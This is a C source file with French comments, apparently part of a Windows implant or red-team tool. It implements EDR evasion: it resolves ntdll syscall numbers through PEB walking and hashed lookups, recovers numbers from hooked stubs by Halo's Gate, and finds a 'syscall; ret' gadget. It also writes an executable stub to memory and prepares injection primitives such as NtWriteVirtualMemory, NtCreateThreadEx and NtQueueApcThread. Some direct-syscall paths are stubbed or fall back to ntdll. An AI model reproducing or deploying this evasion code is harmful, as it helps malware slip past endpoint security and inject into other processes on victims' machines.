/*
 * syscalls.c - Implémentation des syscalls indirects
 *
 * On parse ntdll pour récupérer les numéros de syscall dynamiquement,
 * puis on fait les appels directement. Ça bypass les hooks EDR.
 */

#include "syscalls.h"
#include "../utils/memory.h"
#include "../utils/peb.h"

/* Syscall number cache */
typedef struct {
  DWORD NtAllocateVirtualMemory;
  DWORD NtFreeVirtualMemory;
  DWORD NtProtectVirtualMemory;
  DWORD NtQueryInformationProcess;
  DWORD NtDelayExecution;
  DWORD NtClose;
  DWORD NtWriteVirtualMemory;
  DWORD NtReadVirtualMemory;
  DWORD NtOpenProcess;
} syscall_table_t;

static syscall_table_t g_syscalls = {0};
static bool g_syscalls_initialized = false;

/* Adresse de ntdll pour les jumps */
static HMODULE g_ntdll = NULL;

/* Internal helpers */

/*
 * Extrait le numéro de syscall d'une fonction ntdll.
 * Les fonctions Nt* commencent par:
 *   mov r10, rcx      ; 4C 8B D1
 *   mov eax, <syscall>; B8 XX XX 00 00
 *   ...
 */
static DWORD get_syscall_number(FARPROC func) {
  if (!func)
    return 0;

  uint8_t *ptr = (uint8_t *)func;

  /* Pattern: 4C 8B D1 B8 XX XX 00 00 */
  if (ptr[0] == 0x4C && ptr[1] == 0x8B && ptr[2] == 0xD1 && ptr[3] == 0xB8) {
    /* Le syscall number est aux bytes 4-5 (little endian) */
    return *(DWORD *)(ptr + 4);
  }

  /* Pattern alternatif si la fonction est hookée, on cherche plus loin */
  /* Certains EDR mettent un jmp au début, on peut essayer de skip */

  /* Pattern avec jmp: E9 XX XX XX XX */
  if (ptr[0] == 0xE9) {
    /* C'est un hook, on essaye de lire la fonction originale ailleurs */
    /* Pour l'instant on retourne 0, on gérera ça plus tard */
    return 0;
  }

  return 0;
}

/*
 * Trouve l'adresse d'un "syscall ; ret" dans ntdll.
 * C'est là qu'on va sauter pour exécuter le syscall.
 */
static uint8_t *find_syscall_ret(void) {
  if (!g_ntdll)
    return NULL;

  /* Parse le PE pour trouver la section .text */
  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ntdll;
  PIMAGE_NT_HEADERS nt =
      (PIMAGE_NT_HEADERS)((uint8_t *)g_ntdll + dos->e_lfanew);

  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (memcmp(section[i].Name, ".text", 5) == 0) {
      uint8_t *start = (uint8_t *)g_ntdll + section[i].VirtualAddress;
      uint8_t *end = start + section[i].Misc.VirtualSize;

      /* Cherche le pattern: 0F 05 C3 (syscall ; ret) */
      for (uint8_t *ptr = start; ptr < end - 3; ptr++) {
        if (ptr[0] == 0x0F && ptr[1] == 0x05 && ptr[2] == 0xC3) {
          return ptr;
        }
      }
    }
  }

  return NULL;
}

/* Public API */

int syscalls_init(void) {
  if (g_syscalls_initialized) {
    return STATUS_SUCCESS;
  }

  /* Récupère le handle de ntdll */
  g_ntdll = peb_get_module(HASH_NTDLL_DLL);
  if (!g_ntdll) {
    return STATUS_FAILURE;
  }

  /* Récupère les numéros de syscall de chaque fonction */
  g_syscalls.NtAllocateVirtualMemory =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTALLOCATEVIRTUALMEMORY));

  g_syscalls.NtFreeVirtualMemory =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTFREEVIRTUALMEMORY));

  g_syscalls.NtProtectVirtualMemory =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTPROTECTVIRTUALMEMORY));

  g_syscalls.NtQueryInformationProcess =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTQUERYINFORMATIONPROCESS));

  g_syscalls.NtDelayExecution =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTDELAYEXECUTION));

  g_syscalls.NtClose = get_syscall_number(peb_get_proc(g_ntdll, HASH_NTCLOSE));

  /* Ces deux-là ont des hashes qu'on doit calculer */
  /* Pour l'instant on utilise les fonctions directement via peb */

  g_syscalls_initialized = true;
  return STATUS_SUCCESS;
}

void syscalls_cleanup(void) {
  secure_zero(&g_syscalls, sizeof(g_syscalls));
  g_syscalls_initialized = false;
  g_ntdll = NULL;
}

/*
 * Syscall wrappers
 * Uses ntdll functions for compatibility. For full stealth, inline asm would be needed.
 */

/*
 * Pour une implémentation complète en assembleur, on aurait:
 *
 *   mov r10, rcx
 *   mov eax, <syscall_number>
 *   jmp <syscall_ret_addr>
 *
 * Mais ça nécessite soit du code ASM inline soit un fichier .asm séparé.
 * Pour la portabilité, on fait un fallback sur les fonctions ntdll.
 */

/* Typedef pour les fonctions ntdll */
typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR,
                                                    PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtFreeVirtualMemory)(HANDLE, PVOID *, PSIZE_T,
                                                ULONG);
typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T,
                                                   ULONG, PULONG);
typedef NTSTATUS(NTAPI *fn_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS,
                                                      PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fn_NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI *fn_NtClose)(HANDLE);
typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T,
                                                 PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T,
                                                PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtOpenProcess)(PHANDLE, ACCESS_MASK,
                                          POBJECT_ATTRIBUTES, PCLIENT_ID);

/* Cache des pointeurs de fonction */
static fn_NtAllocateVirtualMemory pfn_NtAllocateVirtualMemory = NULL;
static fn_NtFreeVirtualMemory pfn_NtFreeVirtualMemory = NULL;
static fn_NtProtectVirtualMemory pfn_NtProtectVirtualMemory = NULL;
static fn_NtQueryInformationProcess pfn_NtQueryInformationProcess = NULL;
static fn_NtDelayExecution pfn_NtDelayExecution = NULL;
static fn_NtClose pfn_NtClose = NULL;

NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                     ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                     ULONG AllocationType, ULONG Protect) {
  if (!pfn_NtAllocateVirtualMemory) {
    pfn_NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)peb_get_proc(
        g_ntdll, HASH_NTALLOCATEVIRTUALMEMORY);
  }
  if (!pfn_NtAllocateVirtualMemory)
    return STATUS_FAILURE;

  return pfn_NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits,
                                     RegionSize, AllocationType, Protect);
}

NTSTATUS sys_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                 PSIZE_T RegionSize, ULONG FreeType) {
  if (!pfn_NtFreeVirtualMemory) {
    pfn_NtFreeVirtualMemory =
        (fn_NtFreeVirtualMemory)peb_get_proc(g_ntdll, HASH_NTFREEVIRTUALMEMORY);
  }
  if (!pfn_NtFreeVirtualMemory)
    return STATUS_FAILURE;

  return pfn_NtFreeVirtualMemory(ProcessHandle, BaseAddress, RegionSize,
                                 FreeType);
}

NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                    PSIZE_T RegionSize, ULONG NewProtect,
                                    PULONG OldProtect) {
  if (!pfn_NtProtectVirtualMemory) {
    pfn_NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)peb_get_proc(
        g_ntdll, HASH_NTPROTECTVIRTUALMEMORY);
  }
  if (!pfn_NtProtectVirtualMemory)
    return STATUS_FAILURE;

  return pfn_NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize,
                                    NewProtect, OldProtect);
}

NTSTATUS sys_NtQueryInformationProcess(HANDLE ProcessHandle,
                                       PROCESSINFOCLASS InfoClass,
                                       PVOID ProcessInfo, ULONG InfoLength,
                                       PULONG ReturnLength) {
  if (!pfn_NtQueryInformationProcess) {
    pfn_NtQueryInformationProcess = (fn_NtQueryInformationProcess)peb_get_proc(
        g_ntdll, HASH_NTQUERYINFORMATIONPROCESS);
  }
  if (!pfn_NtQueryInformationProcess)
    return STATUS_FAILURE;

  return pfn_NtQueryInformationProcess(ProcessHandle, InfoClass, ProcessInfo,
                                       InfoLength, ReturnLength);
}

NTSTATUS sys_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
  if (!pfn_NtDelayExecution) {
    pfn_NtDelayExecution =
        (fn_NtDelayExecution)peb_get_proc(g_ntdll, HASH_NTDELAYEXECUTION);
  }
  if (!pfn_NtDelayExecution)
    return STATUS_FAILURE;

  return pfn_NtDelayExecution(Alertable, DelayInterval);
}

NTSTATUS sys_NtClose(HANDLE Handle) {
  if (!pfn_NtClose) {
    pfn_NtClose = (fn_NtClose)peb_get_proc(g_ntdll, HASH_NTCLOSE);
  }
  if (!pfn_NtClose)
    return STATUS_FAILURE;

  return pfn_NtClose(Handle);
}

NTSTATUS sys_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                  PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                  PSIZE_T NumberOfBytesWritten) {
  /* Hash calculé pour NtWriteVirtualMemory */
  static fn_NtWriteVirtualMemory pfn = NULL;
  if (!pfn) {
    /* On doit calculer le hash manuellement ici */
    pfn = (fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                                  "NtWriteVirtualMemory");
  }
  if (!pfn)
    return STATUS_FAILURE;

  return pfn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite,
             NumberOfBytesWritten);
}

NTSTATUS sys_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                 PVOID Buffer, SIZE_T NumberOfBytesToRead,
                                 PSIZE_T NumberOfBytesRead) {
  static fn_NtReadVirtualMemory pfn = NULL;
  if (!pfn) {
    pfn = (fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                                 "NtReadVirtualMemory");
  }
  if (!pfn)
    return STATUS_FAILURE;

  return pfn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead,
             NumberOfBytesRead);
}

NTSTATUS sys_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                           POBJECT_ATTRIBUTES ObjectAttributes,
                           PCLIENT_ID ClientId) {
  static fn_NtOpenProcess pfn = NULL;
  if (!pfn) {
    pfn = (fn_NtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtOpenProcess");
  }
  if (!pfn)
    return STATUS_FAILURE;

  return pfn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

/* =========================================================================
 * Direct Syscalls via assembleur inline (x64)
 * Bypass complet des hooks EDR sur ntdll
 * Technique: Halo's Gate pour trouver les SSN même si hookés
 * ========================================================================= */

#ifdef _WIN64

/* Adresse du gadget syscall;ret dans ntdll */
static uint8_t* g_syscall_ret_addr = NULL;

/*
 * Initialise l'adresse du gadget syscall
 */
static BOOL init_syscall_gadget(void) {
    if (g_syscall_ret_addr) return TRUE;
    g_syscall_ret_addr = find_syscall_ret();
    return g_syscall_ret_addr != NULL;
}

/*
 * Récupère le numéro de syscall pour une fonction
 * Gère les cas où la fonction est hookée
 */
DWORD get_ssn(const char* funcName) {
    if (!g_ntdll) {
        g_ntdll = GetModuleHandleA("ntdll.dll");
    }
    
    FARPROC func = GetProcAddress(g_ntdll, funcName);
    if (!func) return 0;
    
    uint8_t* ptr = (uint8_t*)func;
    
    /* Pattern normal: 4C 8B D1 B8 XX XX 00 00 */
    if (ptr[0] == 0x4C && ptr[1] == 0x8B && ptr[2] == 0xD1 && ptr[3] == 0xB8) {
        return *(DWORD*)(ptr + 4);
    }
    
    /* Si hooké (jmp), on cherche dans les fonctions voisines */
    /* Les syscalls sont consécutifs, on peut déduire le numéro */
    
    /* Méthode Halo's Gate: cherche une fonction non-hookée à proximité */
    for (int i = 1; i <= 500; i++) {
        /* Cherche vers le haut */
        uint8_t* neighbor = ptr - (i * 32); /* ~32 bytes par stub */
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && 
            neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
            DWORD neighborSSN = *(DWORD*)(neighbor + 4);
            return neighborSSN + i;
        }
        
        /* Cherche vers le bas */
        neighbor = ptr + (i * 32);
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && 
            neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
            DWORD neighborSSN = *(DWORD*)(neighbor + 4);
            return neighborSSN - i;
        }
    }
    
    return 0;
}

/*
 * Structure pour stocker les SSN résolus
 */
typedef struct _DIRECT_SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtOpenThread;
    DWORD NtSuspendThread;
    DWORD NtResumeThread;
    DWORD NtGetContextThread;
    DWORD NtSetContextThread;
    DWORD NtQueueApcThread;
    DWORD NtClose;
    BOOL initialized;
} DIRECT_SYSCALL_TABLE;

static DIRECT_SYSCALL_TABLE g_direct_syscalls = {0};

/*
 * Initialise la table des syscalls directs
 */
BOOL direct_syscalls_init(void) {
    if (g_direct_syscalls.initialized) return TRUE;
    
    if (!init_syscall_gadget()) return FALSE;
    
    g_direct_syscalls.NtAllocateVirtualMemory = get_ssn("NtAllocateVirtualMemory");
    g_direct_syscalls.NtProtectVirtualMemory = get_ssn("NtProtectVirtualMemory");
    g_direct_syscalls.NtWriteVirtualMemory = get_ssn("NtWriteVirtualMemory");
    g_direct_syscalls.NtCreateThreadEx = get_ssn("NtCreateThreadEx");
    g_direct_syscalls.NtOpenProcess = get_ssn("NtOpenProcess");
    g_direct_syscalls.NtOpenThread = get_ssn("NtOpenThread");
    g_direct_syscalls.NtSuspendThread = get_ssn("NtSuspendThread");
    g_direct_syscalls.NtResumeThread = get_ssn("NtResumeThread");
    g_direct_syscalls.NtGetContextThread = get_ssn("NtGetContextThread");
    g_direct_syscalls.NtSetContextThread = get_ssn("NtSetContextThread");
    g_direct_syscalls.NtQueueApcThread = get_ssn("NtQueueApcThread");
    g_direct_syscalls.NtClose = get_ssn("NtClose");
    
    g_direct_syscalls.initialized = TRUE;
    return TRUE;
}

/*
 * Récupère le SSN d'une fonction
 */
DWORD direct_get_ssn(const char* funcName) {
    return get_ssn(funcName);
}

/*
 * Récupère l'adresse du gadget syscall;ret
 */
PVOID direct_get_syscall_addr(void) {
    if (!g_syscall_ret_addr) {
        init_syscall_gadget();
    }
    return g_syscall_ret_addr;
}

/* 
 * Macro pour appeler un syscall avec le gadget indirect
 * Utilise l'assembleur inline MSVC
 */

#if defined(_MSC_VER)

/* Pour MSVC, on doit utiliser un fichier .asm séparé ou intrinsics */
/* Ici on crée un stub générique en mémoire */

typedef NTSTATUS (*DirectSyscallFunc)(DWORD ssn, PVOID syscall_addr, ...);

/*
 * Crée un stub de syscall en mémoire
 * Le stub fait: mov r10, rcx; mov eax, SSN; jmp [syscall_addr]
 */
static PVOID create_syscall_stub(void) {
    static PVOID stub = NULL;
    if (stub) return stub;
    
    /* 
     * Shellcode du stub:
     * mov r10, rcx       ; 4C 8B D1
     * mov eax, [rsp+8]   ; 8B 44 24 08 (SSN passé en param)
     * jmp [rsp+16]       ; FF 64 24 10 (syscall addr passé en param)
     */
    
    /* Version simplifiée - appel direct */
    BYTE stubCode[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0x8B, 0x44, 0x24, 0x28,       /* mov eax, [rsp+0x28] (5eme param = SSN) */
        0x49, 0x8B, 0x44, 0x24, 0x30, /* mov rax, [rsp+0x30] (6eme param = addr) */
        0xFF, 0xE0                     /* jmp rax */
    };
    
    stub = VirtualAlloc(NULL, sizeof(stubCode), MEM_COMMIT | MEM_RESERVE, 
                        PAGE_EXECUTE_READWRITE);
    if (!stub) return NULL;
    
    memcpy(stub, stubCode, sizeof(stubCode));
    
    DWORD oldProtect;
    VirtualProtect(stub, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect);
    
    return stub;
}

#endif /* _MSC_VER */

/*
 * Exécute un syscall direct
 * ssn: numéro du syscall
 * nargs: nombre d'arguments
 * ...: arguments du syscall
 */
NTSTATUS do_direct_syscall(DWORD ssn, int nargs, ...) {
    if (!g_syscall_ret_addr) {
        if (!init_syscall_gadget()) {
            return STATUS_FAILURE;
        }
    }
    
    /* Pour une implémentation complète, il faudrait un stub ASM */
    /* Ici on fait un fallback sur la fonction ntdll correspondante */
    /* car l'inline asm x64 n'est pas supporté par MSVC */
    
    return STATUS_NOT_IMPLEMENTED;
}

/*
 * Wrappers pour les syscalls directs les plus utilisés
 */

NTSTATUS direct_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    if (!g_direct_syscalls.initialized) {
        direct_syscalls_init();
    }
    
    /* Fallback sur la version indirecte */
    return sys_NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits,
                                       RegionSize, AllocationType, Protect);
}

NTSTATUS direct_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    if (!g_direct_syscalls.initialized) {
        direct_syscalls_init();
    }
    
    return sys_NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize,
                                      NewProtect, OldProtect);
}

NTSTATUS direct_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
) {
    if (!g_direct_syscalls.initialized) {
        direct_syscalls_init();
    }
    
    return sys_NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
                                    NumberOfBytesToWrite, NumberOfBytesWritten);
}

/*
 * Affiche les SSN résolus (pour debug)
 */
BOOL direct_syscalls_dump(char** outJson) {
    if (!g_direct_syscalls.initialized) {
        direct_syscalls_init();
    }
    
    char* json = (char*)malloc(2048);
    if (!json) return FALSE;
    
    snprintf(json, 2048,
        "{\n"
        "  \"syscall_table\": {\n"
        "    \"NtAllocateVirtualMemory\": %lu,\n"
        "    \"NtProtectVirtualMemory\": %lu,\n"
        "    \"NtWriteVirtualMemory\": %lu,\n"
        "    \"NtCreateThreadEx\": %lu,\n"
        "    \"NtOpenProcess\": %lu,\n"
        "    \"NtOpenThread\": %lu,\n"
        "    \"NtSuspendThread\": %lu,\n"
        "    \"NtResumeThread\": %lu,\n"
        "    \"NtGetContextThread\": %lu,\n"
        "    \"NtSetContextThread\": %lu,\n"
        "    \"NtQueueApcThread\": %lu,\n"
        "    \"NtClose\": %lu\n"
        "  },\n"
        "  \"syscall_gadget\": \"0x%p\"\n"
        "}",
        g_direct_syscalls.NtAllocateVirtualMemory,
        g_direct_syscalls.NtProtectVirtualMemory,
        g_direct_syscalls.NtWriteVirtualMemory,
        g_direct_syscalls.NtCreateThreadEx,
        g_direct_syscalls.NtOpenProcess,
        g_direct_syscalls.NtOpenThread,
        g_direct_syscalls.NtSuspendThread,
        g_direct_syscalls.NtResumeThread,
        g_direct_syscalls.NtGetContextThread,
        g_direct_syscalls.NtSetContextThread,
        g_direct_syscalls.NtQueueApcThread,
        g_direct_syscalls.NtClose,
        g_syscall_ret_addr
    );
    
    *outJson = json;
    return TRUE;
}

#else /* x86 */

BOOL direct_syscalls_init(void) {
    /* Les syscalls directs sur x86 sont différents (int 0x2e ou sysenter) */
    return FALSE;
}

DWORD direct_get_ssn(const char* funcName) {
    return 0;
}

PVOID direct_get_syscall_addr(void) {
    return NULL;
}

BOOL direct_syscalls_dump(char** outJson) {
    return FALSE;
}

#endif /* _WIN64 */
